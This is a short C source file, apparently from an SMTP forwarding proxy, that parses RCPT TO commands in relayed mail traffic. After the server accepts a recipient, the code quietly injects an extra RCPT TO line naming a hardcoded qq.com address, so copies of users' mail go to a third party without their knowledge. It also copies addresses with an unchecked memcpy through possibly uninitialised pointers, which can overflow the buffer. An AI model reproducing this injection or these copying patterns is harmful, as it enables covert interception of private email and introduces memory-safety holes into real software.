#include "zhuanfa.h"


void zhuanfa(struct epolldata *ptr,char *buf)
{
	if(ptr->flagssong==0&&ptr->next->flagssong==0)
	{
		char *ptra;
		if((ptra=strstr(buf,"RCPT"))!=NULL)
		{
			ptr->flagsfasong=1;
			ptr->flagssong=1;
			int wenjianfd;
			char as[20];
			char *prtt1;
			char *prtt2;
			int wenjianidt=0;
			while(buf[wenjianidt]!='\0')
			{
				if(buf[wenjianidt]=='<')
				{
					prtt1=&buf[wenjianidt+1];
				}
				else if(buf[wenjianidt]=='>')
				{
					prtt2=&buf[wenjianidt];
				}
				wenjianidt++;
			}
			char *to=ptr->to;
			memcpy(to,prtt1,prtt2-prtt1);
			to[prtt2-prtt1]='\0';
			to=ptr->next->to;
			memcpy(to,prtt1,prtt2-prtt1);
			to[prtt2-prtt1]='\0';
		}
		else if((ptra=strstr(buf,"rcpt"))!=NULL)
		{
			ptr->flagsfasong=0;
			ptr->flagssong=1;
			int wenjianfd;
			char as[20];
			char *prtt1;
			char *prtt2;
			int wenjianidt=0;
			while(buf[wenjianidt]!='\0')
			{
				if(buf[wenjianidt]=='<')
				{
					prtt1=&buf[wenjianidt+1];
				}
				else if(buf[wenjianidt]=='>')
				{
					prtt2=&buf[wenjianidt];
				}
				wenjianidt++;
			}
			char *to=ptr->to;
			memcpy(to,prtt1,prtt2-prtt1);
			to[prtt2-prtt1]='\0';
			to=ptr->next->to;
			memcpy(to,prtt1,prtt2-prtt1);
			to[prtt2-prtt1]='\0';
		}
	}
	else
	{
		char *ptra;
		ptra=strstr(buf,"250");
		if(ptra!=NULL)
		{
			ptr->next->flagssong=0;
			char getsendbuf[30]="563464232@qq.com";
			char packet[40];
			if(ptr->next->flagsfasong==0)
			{
				sprintf(packet,"rcpt to: <%s>\r\n",getsendbuf);
			}
			else
			{
				sprintf(packet,"RCPT TO: <%s>\r\n",getsendbuf);
			}
			int res=write(ptr->fd,packet,strlen(packet));
			if(res<0)
			{
				fprintf(stderr,"%s,%d,%s",__FILE__,__LINE__,strerror(errno));
				exit (0);
			}
			res=read(ptr->fd,buf,4096);
			if(res<0)
			{
				perror("read");
				system("mail");
				exit (0);
			}
		}
	}
}
